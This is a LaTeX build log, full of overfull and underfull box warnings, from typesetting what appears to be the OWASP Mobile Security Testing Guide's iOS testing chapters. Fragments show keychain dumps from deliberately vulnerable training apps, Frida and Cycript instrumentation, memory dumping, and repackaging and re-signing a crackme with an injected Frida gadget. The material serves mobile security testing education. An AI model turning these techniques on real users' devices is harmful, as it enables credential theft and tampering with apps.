Data[] 

Overfull \hbox (785.39812pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 -------------------------  -------------------
-----------  -----  --------  -------------------  --------------------------  
----------------------------------------------------------------------[] 

Overfull \hbox (351.77951pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:09 +0000  WhenUnlocked       
             None   Password  keychainValue        com.highaltitudehacks.dvia  
mypassword123[] 

Overfull \hbox (408.71944pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  WhenUnlockedThisDev
iceOnly      None   Password  SCAPILazyVector      com.toyopagroup.picaboo     
(failed to decode)[] 

Overfull \hbox (426.2394pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  fideliusDeviceGraph  com.toyopagroup.picaboo     
(failed to decode)[] 

Overfull \hbox (767.87929pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  SCDeviceTokenKey2    com.toyopagroup.picaboo     
00001:FKsDMgVISiavdm70v9Fhv5z+pZfBTTN7xkwSwNvVr2IhVBqLsC7QBhsEjKMxrEjh[] 

Overfull \hbox (601.4393pt too wide) in paragraph at lines 32414--32414
[]\TU/SourceCodePro(6)/m/n/10.95 2019-06-06 10:53:30 +0000  AfterFirstUnlockThi
sDeviceOnly  None   Password  SCDeviceTokenValue2  com.toyopagroup.picaboo     
CJ8Y8K2oE3rhOFUhnxJxDS1Zp8Z25XzgY2EtFyMbW3U=[] 

Overfull \hbox (520.40927pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Pulling: /private/var/containers/Bundle/Ap
plication/92E7C59C-2F0B-47C5-94B7-DCF506DBEB34/iGoat-Swift.app/Info.plist -> /U
sers/razr/.needle/tmp/plist[] 

Overfull \hbox (69.26945pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Setting up local port forwarding to enable
 communications with the Frida server...[] 
[562]
Overfull \hbox (18.89938pt too wide) in paragraph at lines 32481--32481
[]    \TU/SourceCodePro(6)/m/n/10.95 "Data": " (UTF8 String: []CJ8Y8K2oE3rhOFUh
nxJxDS1Zp8Z25XzgY2EtFyMbW3U=[])",[] 

Overfull \hbox (71.45938pt too wide) in paragraph at lines 32481--32481
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Saving output to file: /Users/razr/.needle
/output/frida_script_dump_keychain.txt[] 

Underfull \hbox (badness 4132) in paragraph at lines 32483--32485
[]\TU/SourceSansPro(0)/m/n/10.95 Note that currently only the \TU/SourceCodePro
(6)/m/n/10.95 keychain_dump_frida \TU/SourceSansPro(0)/m/n/10.95 module works o
n iOS 12, but not the

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0a5a8632266244b98216ae2ffb8a6a773b9dbb6d.
png" > [563] [564]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1ddd41202821c8a781630622193411ffb54d0ff1.
png" > [565] [566]
Underfull \hbox (badness 10000) in paragraph at lines 32714--32717
[]\TU/SourceSansPro(0)/m/n/10.95 Information Property List - [][]$[][][][][] []
 [] [] [][][][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][][][][][][][]
 [] [][][][][][][][][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 32717--32719
[]\TU/SourceSansPro(0)/m/n/10.95 UIDeviceFamily - [][]$[][][][][] [] [] [] [][]
[][][][][][][] [] [][][][][] [] [][][] [] [][][][][][][] [] [][][][][][][] [] [
][][][][][][][][][][][][] [] [][][][][][][] []

Overfull \hbox (1.05821pt too wide) in paragraph at lines 32717--32719
[][][][][][][][][] [] [][][][][][][][][][][][][][][][][][][][][] [] [][][][][][
][][] [] [][][][][][][][][][][][] [] [][][][] [] [] [] [][][][][] [] [][][] [] 
[][][] [] [][][] [] [][][][][][][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 32735--32738
[]\TU/SourceSansPro(0)/m/n/10.95 class-dump - [][]$[][][][][] [] [] [] [][][][]
[][] [] [][][] [] [][][][][][][][][][][][] [][] [][][][][][][][] [] [][][] [][]
 [][][][][][][] [][] [][][][][] [] [][][][] [] [][][][][][] [] [][][][][] [][]

Underfull \hbox (badness 10000) in paragraph at lines 32738--32741
[]\TU/SourceSansPro(0)/m/n/10.95 class-dump-z - [][]$[][][][][] [] [] [] [][][]
[][][] [] [][][] [] [][][][][][][][][][][][] [][] [][][][][][][][] [] [][][] []
[] [][][][][][][] [][] [][][][][] [] [][][][] [] [][][][][][] [] [][][][][] [][
]
[567] [568] [569] [570]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7670982e5e0675cd414876d6c2505da3b7519c33.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6ae07a22cc86ccf206cc62961a54d037a436add3.
png" > [571] [572]
Overfull \hbox (253.22957pt too wide) in paragraph at lines 33044--33044
[]  \TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC     ARM         V7  0x00     EXECUT
E    38       4292   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE[
] 

Overfull \hbox (270.74953pt too wide) in paragraph at lines 33044--33044
[]\TU/SourceCodePro(6)/m/n/10.95 MH_MAGIC_64   ARM64        ALL  0x00     EXECU
TE    38       4856   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE
[] 

Overfull \hbox (7.94943pt too wide) in paragraph at lines 33054--33054
[]\TU/SourceCodePro(6)/m/n/10.95 iOS8-jailbreak:~ root# lipo -thin armv7 DamnVu
lnerableIOSApp -output DVIA32[] 

Overfull \hbox (286.0793pt too wide) in paragraph at lines 33066--33066
[]\TU/SourceCodePro(6)/m/n/10.95 @interface FlurryUtil : ./DVIA/DVIA/DamnVulner
ableIOSApp/DamnVulnerableIOSApp/YapDatabase/Extensions/Views/Internal/[] 
[573]
Underfull \hbox (badness 2591) in paragraph at lines 33125--33133
[]\TU/SourceSansPro(0)/m/n/10.95 In addition to the techniques learned in the “
[][]Disassembling and Decompiling[][]” section, for this

Underfull \hbox (badness 1389) in paragraph at lines 33125--33133
\TU/SourceSansPro(0)/m/n/10.95 section you’ll need some understanding of the []
[]Objective-C runtime[][]. For instance, functions like

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/58dbf28ff380c5c9e7a07711dd5b2f67ac2448ce.
png" > [574]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6e69c2562dd8593aead2a562db4a760b9647d1f9.
png" > [575] [576]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/12bde274c195d950e097030a4d940aa69ef599dc.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d3aa388017c64db3d09718bc6afdc1b49657d0a1.
png" > [577] [578]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/4fa0bcc01f6c81e1c689a905d989b9ce170cd436.
png" > [579] [580]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3aa39770f872dc479a47edc037663d4dd7117ffe.
png" > [581] [582]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/07ef2bb02fa4cf9a0fd9f84179a1244d413cb209.
png" > [583] [584]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/65bd1b73aeaa3a7034682bc1d4b2c3b203ad8d79.
png" > [585] [586] [587]
Overfull \hbox (167.8194pt too wide) in paragraph at lines 33506--33506
[] \TU/SourceCodePro(6)/m/n/10.95 1) 61FA3547E0AF42A11E233F6A2B255E6B6AF262CE "
iPhone Distribution: Vantage Point Security Pte. Ltd."[] 

Overfull \hbox (126.20938pt too wide) in paragraph at lines 33506--33506
[] \TU/SourceCodePro(6)/m/n/10.95 2) 8004380F331DCA22CC1B47FB1A805890AE41C938 "
iPhone Developer: Bernhard Müller (RV852WND79)"[] 
[588]
Overfull \hbox (262.93832pt too wide) in paragraph at lines 33525--33535
\TU/SourceSansPro(0)/m/n/10.95 home directory: \TU/SourceCodePro(6)/m/n/10.95 ~
/Library/Developer/Xcode/DerivedData/<ProjectName>/Build/Products/Debug-iphoneo
s/<ProjectName>.app/\TU/SourceSansPro(0)/m/n/10.95 .

Overfull \hbox (91.16939pt too wide) in paragraph at lines 33563--33563
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/libexec/PlistBuddy -x -c []Print :Entit
lements[] profile.plist > entitlements.plist[] 

Overfull \hbox (187.52934pt too wide) in paragraph at lines 33563--33563
[]\TU/SourceCodePro(6)/m/n/10.95 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.
0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">[] 
[589]
Overfull \hbox (73.64941pt too wide) in paragraph at lines 33600--33600
[]\TU/SourceCodePro(6)/m/n/10.95 $ ln -s <your-path-to-ios-deploy>/build/Releas
e/ios-deploy /usr/local/bin/ios-deploy[] 
[590]
Overfull \hbox (505.07933pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3   20614
4 189774 /private/var/containers/Bundle/Application/F390A491-3524-40EA-B3F8-6C1
FA105A23A/iOweApp.app/iOweApp[] 

Overfull \hbox (1059.14919pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3     549
2 213230 /private/var/mobile/Containers/Data/Application/5AB3E437-9E2D-4F04-BD2
B-972F6055699E/tmp/com.apple.dyld/iOweApp-6346DC276FE6865055F1194368EC73CC72E4C
5224537F7F23DF19314CF6FD8AA.closure[] 

Overfull \hbox (207.23941pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,3    3062
8 212198 /private/var/preferences/Logging/.plist-cache.vqXhr1EE[] 

Overfull \hbox (75.83948pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,2    5008
0 234433 /usr/lib/libobjc-trampolines.dylib[] 

Overfull \hbox (161.24944pt too wide) in paragraph at lines 33662--33662
[]\TU/SourceCodePro(6)/m/n/10.95 iOweApp 2828 mobile  txt    REG    1,2   34420
4  74185 /System/Library/Fonts/AppFonts/ChalkboardSE.ttc[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 33683--33683
[]\TU/SourceCodePro(6)/m/n/10.95 launchd   1 root   31u  IPv4 0x69c2ce211253b90
b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 33683--33683
[]\TU/SourceCodePro(6)/m/n/10.95 launchd   1 root   42u  IPv4 0x69c2ce211253b90
b      0t0  TCP 192.168.1.12:ssh->192.168.1.8:62684 (ESTABLISHED)[] 
[591]
Underfull \hbox (badness 1762) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 use it for attaching, stepping or continuing the
 process but they cannot use it to read or write

Underfull \hbox (badness 1997) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 Mach IPC interface API functions to perform acti
ons such as suspending the target process and

Underfull \hbox (badness 1881) in paragraph at lines 33711--33722
\TU/SourceSansPro(0)/m/n/10.95 reading/writing register states (\TU/SourceCodeP
ro(6)/m/n/10.95 thread_get_state\TU/SourceSansPro(0)/m/n/10.95 /\TU/SourceCodeP
ro(6)/m/n/10.95 thread_set_state\TU/SourceSansPro(0)/m/n/10.95 ) and virtual me
mory

Overfull \hbox (371.48932pt too wide) in paragraph at lines 33749--33749
[]\TU/SourceCodePro(6)/m/n/10.95 /Applications/Xcode.app/Contents/Developer/Pla
tforms/iPhoneOS.platform/DeviceSupport/<target-iOS-version>/DeveloperDiskImage.
dmg[] 
[592] [593] [594] [595]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ebc00f60d8d1aad4169130902c075b6da5552d9c.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2232357dcab82a2afd5c51a6eeb185b4f7f281e9.
png" > [596]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a3b0e5e3a2b9e0460b87f2fd5e167803aa68278f.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/aafba1daf9b3c7d33c63306630e1ad7c2adea156.
png" > [597] [598]
Overfull \hbox (229.13936pt too wide) in paragraph at lines 34059--34059
[]\TU/SourceCodePro(6)/m/n/10.95 -[NSURL isMusicStoreURL]: Loaded handler at "/
Users/berndt/Desktop/__handlers__/__NSURL_isMusicStoreURL_.js"[] 

Overfull \hbox (202.85934pt too wide) in paragraph at lines 34059--34059
[]\TU/SourceCodePro(6)/m/n/10.95 -[NSURL isAppStoreURL]: Loaded handler at "/Us
ers/berndt/Desktop/__handlers__/__NSURL_isAppStoreURL_.js"[] 

Overfull \hbox (150.29941pt too wide) in paragraph at lines 34073--34073
[] \TU/SourceCodePro(6)/m/n/10.95 21324 ms     | -[NSURLRequest initWithURL:0x1
06388b00 cachePolicy:0x0 timeoutInterval:0x106388b80[] 
[599]
Underfull \hbox (badness 5374) in paragraph at lines 34144--34150
\TU/SourceSansPro(0)/m/n/10.95 a point where performing further manual analysis
 was cumbersome. The function at offset
[600]
Underfull \hbox (badness 2103) in paragraph at lines 34171--34174
[]\TU/SourceSansPro(0)/m/n/10.95 Pass the above \TU/SourceCodePro(6)/m/n/10.95 
callable \TU/SourceSansPro(0)/m/n/10.95 object to the concrete execution engine
, which in this case is
[601]
Overfull \hbox (316.73938pt too wide) in paragraph at lines 34251--34251
[]\TU/SourceCodePro(6)/m/n/10.95 $ optool install -c load -p "@executable_path/
FridaGadget.dylib"  -t Payload/UnCrackable\ Level\ 1.app/UnCrackable\ Level\ 1[
] 

Overfull \hbox (14.51944pt too wide) in paragraph at lines 34251--34251
[]\TU/SourceCodePro(6)/m/n/10.95 Writing executable to Payload/UnCrackable Leve
l 1.app/UnCrackable Level 1...[] 

Overfull \hbox (163.43936pt too wide) in paragraph at lines 34267--34267
[]\TU/SourceCodePro(6)/m/n/10.95 $ cp AwesomeRepackaging.mobileprovision Payloa
d/UnCrackable\ Level\ 1.app/embedded.mobileprovision[] 

Overfull \hbox (334.25934pt too wide) in paragraph at lines 34276--34276
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/libexec/PlistBuddy -c "Set :CFBundleIde
ntifier sg.vantagepoint.repackage" Payload/UnCrackable\ Level\ 1.app/Info.plist
[] 
[602]
Overfull \hbox (353.9693pt too wide) in paragraph at lines 34287--34287
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/bin/codesign --force --sign 8004380F331
DCA22CC1B47FB1A805890AE41C938  Payload/UnCrackable\ Level\ 1.app/FridaGadget.dy
lib[] 

Overfull \hbox (38.6094pt too wide) in paragraph at lines 34287--34287
[]\TU/SourceCodePro(6)/m/n/10.95 Payload/UnCrackable Level 1.app/FridaGadget.dy
lib: replacing existing signature[] 

Overfull \hbox (590.48926pt too wide) in paragraph at lines 34295--34295
[]\TU/SourceCodePro(6)/m/n/10.95 $ /usr/bin/codesign --force --sign 8004380F331
DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plist Payload/UnCrack
able\ Level\ 1.app/UnCrackable\ Level\ 1[] 

Overfull \hbox (47.36943pt too wide) in paragraph at lines 34295--34295
[]\TU/SourceCodePro(6)/m/n/10.95 Payload/UnCrackable Level 1.app/UnCrackable Le
vel 1: replacing existing signature[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/94b4595a116ad9f96b949066605079edc2104eb6.
png" > [603]
Overfull \hbox (231.49368pt too wide) in paragraph at lines 34344--34349
[]\TU/SourceSansPro(0)/m/n/10.95 At installation time, the application archive 
is unpacked into the folder \TU/SourceCodePro(6)/m/n/10.95 /private/var/contain
ers/Bundle/Application/[GUID]/[APP].app

Overfull \hbox (46.50075pt too wide) in paragraph at lines 34387--34390
[]\TU/SourceSansPro(0)/m/n/10.95 Put the \TU/SourceSansPro(0)/m/it/10.95 patche
d code \TU/SourceSansPro(0)/m/n/10.95 on a single line and copy it into the ori
ginal \TU/SourceCodePro(6)/m/n/10.95 Payload/[APP].app/main.jsbundle
[604]
Overfull \hbox (40.79941pt too wide) in paragraph at lines 34468--34468
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://cydia.saurik.com/api/latest/3 -
O cycript.zip && unzip cycript.zip[] 
[605]
Overfull \hbox (80.21939pt too wide) in paragraph at lines 34489--34489
[]\TU/SourceCodePro(6)/m/n/10.95 501 78 1 0 0:00.00 ?? 0:10.57 /System/Library/
CoreServices/SpringBoard.app/SpringBoard[] 

Overfull \hbox (583.91928pt too wide) in paragraph at lines 34512--34512
[]\TU/SourceCodePro(6)/m/n/10.95 cy# alertView = [[UIAlertView alloc] initWithT
itle:@"OWASP MSTG" message:@"Mobile Security Testing Guide"  delegate:nil cance
lButtonitle:@"OK" otherButtonTitles:nil][] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 34512--34512
[]\TU/SourceCodePro(6)/m/n/10.95 #"<UIAlertView: 0x1645c550; frame = (0 0; 0 0)
; layer = <CALayer: 0x164df160>>"[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f891e21426c16da3312771ade698d40bf018f411.
png" > [606]
Overfull \hbox (198.47935pt too wide) in paragraph at lines 34525--34525
[]\TU/SourceCodePro(6)/m/n/10.95 cy# [[NSFileManager defaultManager] URLsForDir
ectory:NSDocumentDirectory inDomains:NSUserDomainMask][0][] 

Overfull \hbox (161.24933pt too wide) in paragraph at lines 34525--34525
[]\TU/SourceCodePro(6)/m/n/10.95 #"file:///var/mobile/Containers/Data/Applicati
on/A8AE15EE-DC8B-4F1C-91A5-1FED35212DF/Documents/"[] 
[607] [608]
Overfull \hbox (12.32939pt too wide) in paragraph at lines 34596--34596
[]    \TU/SourceCodePro(6)/m/n/10.95 "/System/Library/Frameworks/CoreFoundation
.framework/CoreFoundation": [[] 

Overfull \hbox (229.13933pt too wide) in paragraph at lines 34596--34596
[]    \TU/SourceCodePro(6)/m/n/10.95 "/private/var/containers/Bundle/Applicatio
n/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp": [[] 
[609]
Overfull \hbox (286.07935pt too wide) in paragraph at lines 34652--34652
[]        \TU/SourceCodePro(6)/m/n/10.95 "path": "/private/var/containers/Bundl
e/Application/F390A491-3524-40EA-B3F8-6C1FA105A23A/iOweApp.app/iOweApp",[] 

Overfull \hbox (16.70943pt too wide) in paragraph at lines 34652--34652
[]        \TU/SourceCodePro(6)/m/n/10.95 "path": "/System/Library/Frameworks/Fo
undation.framework/Foundation",[] 
[610] [611]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6a60765ca34ee9e713a1c08bd8506a2ef18541bf.
png" > [612] [613] [614]
Underfull \hbox (badness 1400) in paragraph at lines 34866--34870
\TU/SourceSansPro(0)/m/n/10.95 main app binary iGoat-Swift is located at \TU/So
urceCodePro(6)/m/n/10.95 0x0000000100b7c000 \TU/SourceSansPro(0)/m/n/10.95 and 
the Realm Framework at

Overfull \hbox (483.17842pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 --------------------------------  ----------- 
 --------------------  --------------------------------------------------------
----------------------[] 

Overfull \hbox (426.23946pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 iGoat-Swift                       0x100b7c000 
 2506752 (2.4 MiB)     /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B2
74-FBCA66589E67/iGo...[] 

Overfull \hbox (95.54951pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 TweakInject.dylib                 0x100eb4000 
 16384 (16.0 KiB)      /usr/lib/TweakInject.dylib[] 

Overfull \hbox (445.94937pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 SystemConfiguration               0x1862c0000 
 446464 (436.0 KiB)    /System/Library/Frameworks/SystemConfiguration.framework
/SystemConfiguratio...[] 

Overfull \hbox (73.64952pt too wide) in paragraph at lines 34885--34885
[]\TU/SourceCodePro(6)/m/n/10.95 libc++.1.dylib                    0x1847c0000 
 368640 (360.0 KiB)    /usr/lib/libc++.1.dylib[] 

Overfull \hbox (34.01901pt too wide) in paragraph at lines 34909--34913
[]\TU/SourceSansPro(0)/m/n/10.95 You can adjust your search by using the search
 settings \TU/SourceCodePro(6)/m/n/10.95 \e~search\TU/SourceSansPro(0)/m/n/10.9
5 . For example, \TU/SourceCodePro(6)/m/n/10.95 \e search.quiet=true;
[615] [616]
Overfull \hbox (29.84941pt too wide) in paragraph at lines 35048--35048
[]\TU/SourceCodePro(6)/m/n/10.95 iPhone on (iPhone: 10.3.1) [usb] # memory dump
 all /Users/foo/memory_iOS/memory[] 

Overfull \hbox (75.83943pt too wide) in paragraph at lines 35048--35048
[]\TU/SourceCodePro(6)/m/n/10.95 Dumping 768.0 KiB from base: 0x1ad200000  [###
#################################]  100%[] 
[617]
Overfull \hbox (36.41937pt too wide) in paragraph at lines 35075--35075
[]\TU/SourceCodePro(6)/m/n/10.95 Progress: [###################################
###############] 100.0% Complete[] 

Overfull \hbox (36.41937pt too wide) in paragraph at lines 35075--35075
[]\TU/SourceCodePro(6)/m/n/10.95 Progress: [###################################
###############] 100.0% Complete[] 
[618] [619] [620]
Overfull \hbox (12.32951pt too wide) in paragraph at lines 35249--35249
[]\TU/SourceCodePro(6)/m/n/10.95 │       │   0x18eec5ca2      02aa9b494197   ad
d ch, byte [rdx - 0x68beb665] ; arg3[] 
[621]
Underfull \hbox (badness 2343) in paragraph at lines 35306--35309
[]\TU/SourceSansPro(0)/m/n/10.95 iOS Instrumentation without Jailbreak - [][]$[
][][][][] [] [] [] [][][] [] [][][][][][][][] [] [][][][][] [] [][] [] [][][][]
[] [][] [][] [] [][][][][][][][] [][]
[622]
Underfull \hbox (badness 10000) in paragraph at lines 35363--35366
[]\TU/SourceSansPro(0)/m/n/10.95 OWASP UnCrackable Apps for iOS - [][]$[][][][]
[] [] [] [] [][][][][][] [] [][][] [] [][][][][] [] [][][][][] [][] [][][][] []
 [][][][] [] [][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 35370--35373
[]\TU/SourceSansPro(0)/m/n/10.95 Reverse Engineering tools for iOS Apps - [][]$
[][][][] [] [] [] [][][][][][][][][][][][][] [] [][][] [] [][][][][] [] [][][] 
[] [][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 35375--35377
[]\TU/SourceSansPro(0)/m/n/10.95 Xcode command line developer tools - [][]$[][]
[][][] [] [] [] [][][][][][][][][] [] [][][][][][] [] [][] [] [][][][][] [][] [
][][][][][][] [][] [][][][] [][]
[623]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/153fa4a61498a02f5937730470fadbf4339e20ac.
jpg" > [624] [625]
Underfull \hbox (badness 10000) in paragraph at lines 35554--35556
[]\TU/SourceCodePro(6)/m/n/10.95 AccessControlFlags \TU/SourceSansPro(0)/m/n/10
.95 define the mechanisms with which users can authenticate the key

Overfull \hbox (164.11397pt too wide) in paragraph at lines 35576--35581
[]\TU/SourceSansPro(0)/m/n/10.95 Please note that keys secured by Touch ID (via
 \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryAny \TU/SourceSansPro(
0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 kSecAccessControlBiometryCurrent
Set\TU/SourceSansPro(0)/m/n/10.95 )
[626]
Overfull \hbox (40.7994pt too wide) in paragraph at lines 35604--35604
[]    \TU/SourceCodePro(6)/m/n/10.95 return LAContext().canEvaluatePolicy(.devi
ceOwnerAuthentication, error: nil)[] 

Overfull \hbox (42.98941pt too wide) in paragraph at lines 35616--35616
[]  \TU/SourceCodePro(6)/m/n/10.95 if ([context canEvaluatePolicy:LAPolicyDevic
eOwnerAuthentication error:nil]) {[] 
[627] [628]
Underfull \hbox (badness 3536) in paragraph at lines 35726--35729
\TU/SourceCodePro(6)/m/n/10.95 kSecAttrTokenIDSecureEnclave\TU/SourceSansPro(0)
/m/n/10.95 : this indicates that we want to use the Secure Enclave
[629] [630] [631]
Overfull \hbox (176.57944pt too wide) in paragraph at lines 35906--35906
[]\TU/SourceCodePro(6)/m/n/10.95 // Open the encrypted Realm file where getKey(
) is a method to obtain a key from the Keychain or a server[] 

Overfull \hbox (40.79945pt too wide) in paragraph at lines 35906--35906
[]  \TU/SourceCodePro(6)/m/n/10.95 // If the encryption key is wrong, []error[]
 will say that it[]s an invalid database[] 
[632]
Overfull \hbox (12.2613pt too wide) in paragraph at lines 35966--35969
[]\TU/SourceSansPro(0)/m/n/10.95 Navigate to the output directory and locate \T
U/SourceCodePro(6)/m/n/10.95 $APP_NAME.imazing\TU/SourceSansPro(0)/m/n/10.95 . 
Rename it to \TU/SourceCodePro(6)/m/n/10.95 $APP_NAME.zip\TU/SourceSansPro(0)/m
/n/10.95 . 
[633]
Underfull \hbox (badness 1762) in paragraph at lines 36016--36021
\TU/SourceSansPro(0)/m/n/10.95 an iOS device. With access to the source code an
d Xcode the app can be build and deployed

Underfull \hbox (badness 1769) in paragraph at lines 36016--36021
\TU/SourceSansPro(0)/m/n/10.95 in the iOS simulator. The file system of the cur
rent device of the iOS simulator is available in
[634] [635] [636]
Overfull \hbox (195.2431pt too wide) in paragraph at lines 36260--36264
\TU/SourceSansPro(0)/m/n/10.95 tion and spell checking. Most keyboard input is 
cached by default, in \TU/SourceCodePro(6)/m/n/10.95 /private/var/mobile/Librar
y/Keyboard/dynamic-text.dat\TU/SourceSansPro(0)/m/n/10.95 . 
[637]
Underfull \hbox (badness 5119) in paragraph at lines 36274--36282
[]\TU/SourceCodePro(6)/m/n/10.95 var autocorrectionType: UITextAutocorrectionTy
pe \TU/SourceSansPro(0)/m/n/10.95 determines whether

Underfull \hbox (badness 2245) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 autocorrection is enabled during typing. When au
tocorrection is enabled, the text object

Underfull \hbox (badness 2547) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 tracks unknown words and suggests suitable repla
cements, replacing the typed text auto-

Underfull \hbox (badness 1515) in paragraph at lines 36274--36282
\TU/SourceSansPro(0)/m/n/10.95 matically unless the user overrides the replacem
ent. The default value of this property is

Overfull \hbox (15.45145pt too wide) in paragraph at lines 36311--36318
\TU/SourceSansPro(0)/m/n/10.95 Bars. For data that should be masked, such as PI
Ns and passwords, set \TU/SourceCodePro(6)/m/n/10.95 textObject.secureTextEntry

[638]
Overfull \hbox (71.45938pt too wide) in paragraph at lines 36378--36378
[]\TU/SourceCodePro(6)/m/n/10.95 [*] Saving output to file: /home/phanvanloc/.n
eedle/output/keyboard_autocomplete.txt[] 
[639] [640] [641] [642]
Underfull \hbox (badness 10000) in paragraph at lines 36610--36616
[]\TU/SourceSansPro(0)/m/n/10.95 Keychain items for which the \TU/SourceCodePro
(6)/m/n/10.95 kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly

Overfull \hbox (26.82729pt too wide) in paragraph at lines 36651--36658
\TU/SourceSansPro(0)/m/n/10.95 by default, you can [][]exclude files from the b
ackup[][] by calling \TU/SourceCodePro(6)/m/n/10.95 NSURL setResourceValue:forK
ey:error:
[643]
Overfull \hbox (14.51959pt too wide) in paragraph at lines 36692--36692
[]                                  \TU/SourceCodePro(6)/m/n/10.95 forKey: NSUR
LIsExcludedFromBackupKey error: &error];[] 

Overfull \hbox (47.36948pt too wide) in paragraph at lines 36692--36692
[]        \TU/SourceCodePro(6)/m/n/10.95 NSLog(@"Error excluding %@ from backup
 %@", [URL lastPathComponent], error);[] 

Overfull \hbox (23.27939pt too wide) in paragraph at lines 36722--36722
[]\TU/SourceCodePro(6)/m/n/10.95 func excludeFileFromBackup(filePath: URL) -> R
esult<Bool, ExcludeFileError> {[] 
[644]
Overfull \hbox (137.15941pt too wide) in paragraph at lines 36722--36722
[]        \TU/SourceCodePro(6)/m/n/10.95 return .failure(.error("Error excludin
g \(file.lastPathComponent) from backup \(error)"))[] 
[645]
Overfull \hbox (68.13258pt too wide) in paragraph at lines 36845--36847
\TU/SourceSansPro(0)/m/n/10.95 abled](Images/Chapters/0x06d/bither_demo_enable_
pin.PNG” 

Overfull \hbox (60.60991pt too wide) in paragraph at lines 36848--36851
\TU/SourceSansPro(0)/m/n/10.95 src=”Images/Chapters/0x06d/bither_demo_pin_scree
n.PNG){ 
[646]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/72b672220e785bc400e77500d5ace5fe63dd4db6.
png" > [647]
Underfull \hbox (badness 2951) in paragraph at lines 36900--36905
[]\TU/SourceSansPro(0)/m/n/10.95 The free workaround, however, is to find the p
list file in the obfuscated backup generated by

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/56de6a9d5ff0c19a00dc35b70da7bad221861447.
png" > [648]
Overfull \hbox (62.6994pt too wide) in paragraph at lines 36967--36967
[]    \TU/SourceCodePro(6)/m/n/10.95 UIImageView *myBanner = [[UIImageView allo
c] initWithImage:@"overlayImage.png"];[] 

Overfull \hbox (21.08937pt too wide) in paragraph at lines 36982--36983
[]\TU/SourceCodePro(6)/m/n/10.95 /var/mobile/Containers/Data/Application/$APP_I
D/Library/Caches/Snapshots/ 

Overfull \hbox (430.61925pt too wide) in paragraph at lines 36999--36999
